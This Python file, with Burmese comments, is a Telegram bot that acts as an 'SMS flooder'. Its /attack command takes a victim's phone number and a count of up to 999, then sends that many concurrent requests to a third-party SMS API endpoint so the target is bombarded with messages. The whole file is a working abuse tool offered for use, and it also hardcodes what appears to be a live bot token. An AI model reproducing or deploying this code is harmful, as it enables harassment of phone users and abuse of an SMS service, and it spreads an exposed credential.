import os
import asyncio
import logging
import aiohttp
from aiogram import Bot, Dispatcher, executor, types

# 📝 Logging စနစ်ဖွင့်ခြင်း
logging.basicConfig(level=logging.INFO)

# 🔑 ကိုကိုပေးထားသည့် Bot Token ကို တိုက်ရိုက် သတ်မှတ်ခြင်း
BOT_TOKEN = "8702294693:AAGF_mmGKAg7-mWBuAl34jevVtDJ0mZE8HU"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

# 🌐 API Target Endpoint
SMS_API_URL = "https://api.maharprod.com/sms/v1/movie/telenor/atom_sms"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🚀 ၁။ START COMMAND HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@dp.message_handler(commands=['start', 'help'])
async def send_welcome(message: types.Message):
    welcome_text = (
        "⚡ **PREMIUM SMS ASYNC FLASH FLOODER**\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🤖 **Developer:** `Dominic`\n"
        "🟢 **Core Status:** `READY TO LAUNCH`\n\n"
        "🛠 **အသုံးပြုနည်းလမ်း:**\n"
        "ရိုက်ရန် -> `/attack [ဖုန်းနံပါတ်] [အကြိမ်ရေ]`\n"
        "📝 *ဥပမာ:* `/attack 0997xxxxxxx 50`\n"
        "⚠️ *(အမြင့်ဆုံး အကြိမ် ၉၉၉ ထိ စွမ်းဆောင်နိုင်သည်)*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🌌 *Engine fully tuned under Dominic Operations.*"
    )
    await message.answer(welcome_text, parse_mode="Markdown")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ⚡ ၂။ ASYNC REQUEST WORKER (တစ်ကြိမ်ချင်းစီ ပို့မည့် စက်ရုပ်ငယ်)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def send_single_sms(session, phone):
    # API က တောင်းဆိုမည့် Parameter / Payload 
    # (မှတ်ချက် - API ရဲ့ Form Data သတ်မှတ်ချက်ပေါ်မူတည်၍ phone သို့မဟုတ် mobile ဖြစ်နိုင်သည်)
    payload = {
        "phone": phone,
        "mobile": phone
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Android; 13; Mobile)",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        async with session.post(SMS_API_URL, data=payload, headers=headers, timeout=5) as response:
            if response.status == 200:
                return True
            return False
    except Exception:
        return False

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🔥 ၃။ ASYNC FLASH FLOOD ENGINE (အမြန်ဆုံး ၉၉၉ ကြိမ် ပို့မည့်စနစ်)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@dp.message_handler(commands=['attack'])
async def start_sms_flood(message: types.Message):
    args = message.text.split()
    if len(args) < 3:
        await message.answer("💡 **Format မှားယွင်းနေပါသည်။**\n📝 အသုံးပြုပုံ: `/attack [ဖုန်းနံပါတ်] [အကြိမ်ရေ]`")
        return

    target_phone = args[1]
    try:
        amount = int(args[2])
    except ValueError:
        await message.answer("❌ အကြိမ်ရေသည် ကိန်းဂဏန်း သီးသန့် ဖြစ်ရပါမည်။")
        return

    # အမြင့်ဆုံး ၉၉၉ ကြိမ် ကန့်သတ်ချက်
    if amount > 999:
        amount = 999
    elif amount < 1:
        await message.answer("❌ အကြိမ်ရေသည် အနည်းဆုံး ၁ ကြိမ် ဖြစ်ရပါမည်။")
        return

    status_msg = await message.answer(f"🚀 **ATTACK INITIALIZED...**\n🎯 **Target:** `{target_phone}`\n📊 **Payload Volume:** `{amount} Requests`")

    # Async Http Session ဖွင့်လှစ်ပြီး အပြိုင်ပို့ခြင်း (Concurrent Tasks)
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(amount):
            tasks.append(send_single_sms(session, target_phone))
        
        # ရှိသမျှ Task ၉၉၉ ခုလုံးကို Cloud ပေါ်ကနေ တစ်ပြိုင်နက် ဆောင့်ပစ်ခြင်း
        results = await asyncio.gather(*tasks)
        
        # အောင်မြင်မှု ရလဒ် တွက်ချက်ခြင်း
        success_count = sum(1 for res in results if res)
        failed_count = amount - success_count

    # UI အဆုံးသတ် ရလဒ် ထုတ်ပြန်ခြင်း
    final_ui = (
        "⚡ **SMS FLASH ATTACK COMPLETED**\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 **Target Node:** `{target_phone}`\n"
        f"🚀 **Total Transmitted:** `{amount} Packets`\n"
        f"🟢 **Delivered Success:** `{success_count}`\n"
        f"🔴 **Dropped/Blocked:** `{failed_count}`\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🛰️ *Status: NODE INFILTRATION CONCLUDED BY DOMINIC*"
    )
    await bot.edit_message_text(final_ui, message.chat.id, status_msg.message_id, parse_mode="Markdown")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ⚙️ BOT PROCESS TRIGGER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
if __name__ == '__main__':
    print("--- Dominic SMS Flooder Engine Online ---")
    executor.start_polling(dp, skip_updates=True)
